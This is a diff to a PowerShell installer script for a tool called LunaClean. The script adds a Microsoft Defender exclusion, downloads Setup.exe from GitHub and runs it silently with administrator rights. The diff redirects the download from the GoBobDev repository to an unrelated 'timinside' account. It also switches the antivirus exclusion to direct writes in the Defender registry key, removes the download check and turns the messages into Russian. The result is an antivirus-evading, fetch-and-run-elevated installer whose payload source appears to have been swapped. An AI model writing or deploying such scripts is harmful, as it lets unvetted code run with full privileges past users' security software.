@@ -1,34 +1,28 @@
 $tempPath = "C:\Program Files\GoBobDev\LunaClean\Temp"
 $filename = Join-Path -Path $tempPath -ChildPath "Setup.exe"
-$url = "https://github.com/GoBobDev/LunaClean/releases/latest/download/Setup.exe"
+$url = "https://github.com/timinside/LunaClean/releases/latest/download/Setup.exe "
 
 function Write-Log {
-    param (
-        [string]$message
-    )
+    param ([string]$message)
     Write-Host "[INFO] $message"
 }
 
-function Add-DefenderExclusion {
-    param (
-        [string]$path
-    )
-    try {
-        Start-Process -FilePath "powershell" -ArgumentList "-Command `"Add-MpPreference -ExclusionPath '$path'`"" -Verb RunAs -Wait
-    } catch {
-        Write-Host "[ERROR] File ExclusionPath Add (MS Defender) failed: $_"
-        exit 1
+function Add-DefenderExclusionRegistry {
+    param ([string]$path)
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows Defender\Exclusions\Paths"
+    if (-not (Test-Path $regPath)) {
+        New-Item -Path $regPath -Force
     }
+    $escapedPath = $path.Replace('\', '\\')
+    Set-ItemProperty -Path $regPath -Name $escapedPath -Type DWord -Value 0 -Force
 }
 
-function Remove-DefenderExclusion {
-    param (
-        [string]$path
-    )
-    try {
-        Start-Process -FilePath "powershell" -ArgumentList "-Command `"Remove-MpPreference -ExclusionPath '$path'`"" -Verb RunAs -Wait
-    } catch {
-        Write-Host "[ERROR] File ExclusionPath Removing (MS Defender) failed: $_"
+function Remove-DefenderExclusionRegistry {
+    param ([string]$path)
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows Defender\Exclusions\Paths"
+    if (Test-Path $regPath) {
+        $escapedPath = $path.Replace('\', '\\')
+        Remove-ItemProperty -Path $regPath -Name $escapedPath -ErrorAction SilentlyContinue
     }
 }
 
@@ -40,45 +34,31 @@ function Test-Admin {
 }
 
 if (-not (Test-Admin)) {
-    Write-Host "[ERROR] You need to run PowerShell as Administrator!"
-    Write-Host " -> Press any key to exit."
+    Write-Log "Запустите PowerShell от имени администратора!"
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     exit 1
 }
 
 try {
-    # Create directory if it doesn't exist
     if (-not (Test-Path -Path $tempPath)) {
         New-Item -Path $tempPath -ItemType Directory
     }
 
-    Add-DefenderExclusion -path $filename
+    Add-DefenderExclusionRegistry -path $filename
 
-    Write-Log "Downloading..."
+    Write-Log "Скачивание LunaClean..."
     Invoke-WebRequest -Uri $url -OutFile $filename -ErrorAction Stop
 
-    if (Test-Path $filename) {
-        Write-Log "Files downloaded. They will be deleted after installation."
-    } else {
-        Write-Host "[ERROR] File downloading error."
-        Remove-DefenderExclusion -path $filename
-        exit 1
-    }
+    Write-Log "Установка LunaClean..."
+    Start-Process -FilePath $filename -ArgumentList '/VERYSILENT /TASKS="desktopicon"' -Verb RunAs -Wait
 
-    # Use Start-Process directly
-    Start-Process -FilePath $filename -ArgumentList '/VERYSILENT' -Verb RunAs -Wait
+    $removeCommandXTweaker = "Remove-Item -Path '$filename' -ErrorAction Stop"
+    Start-Process -FilePath "powershell" -ArgumentList "-Command $removeCommandXTweaker" -Verb RunAs -Wait
 
-    # Remove file with elevated privileges
-    $removeCommand = "Remove-Item -Path '$filename' -ErrorAction Stop"
-    Start-Process -FilePath "powershell" -ArgumentList "-Command $removeCommand" -Verb RunAs -Wait
+    Remove-DefenderExclusionRegistry -path $filename
 
-    Remove-DefenderExclusion -path $filename
-
-    Write-Log "Installation completed. Press any key to exit."
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    Write-Log "Установка завершена. Спасибо за выбор."
 
 } catch {
-    Write-Host "[ERROR] Error code: $_"
-    Write-Host " -> Press any key to exit."
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    Write-Log "Ошибка: $_"
 }
